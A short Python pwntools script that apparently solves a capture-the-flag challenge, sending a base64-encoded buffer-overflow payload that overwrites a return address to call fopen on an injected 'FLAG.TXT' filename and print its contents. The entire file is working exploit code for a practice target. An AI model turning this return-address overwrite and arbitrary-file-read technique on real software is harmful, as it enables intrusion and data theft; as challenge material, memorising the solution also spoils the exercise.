#!/usr/bin/env python3

from pwn import *

def conn():
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 14899)
    else:
        p = process('./server.py')
    return p

fopen_input = 0x02a1
data_rt = 0x00b4
data_flag = 0x003e

payload = b'a'*0x22 # filler 
payload += pack(fopen_input, 16) # return address, will jump to fopen call in main
payload += pack(data_flag, 16) # first fopen arg, points to FLAG.TXT injected below
payload += pack(data_rt, 16) # second fopen arg , points to existing string rt
payload += b'x'*0x40 # filler 
payload += b'FLAG.TXT\x00' # filename

p = conn()
p.sendlineafter(b':', base64.b64encode(payload))
p.recvuntil(b'OUTPUT.TXT:')
data = p.recvline()
print(base64.b64decode(data))
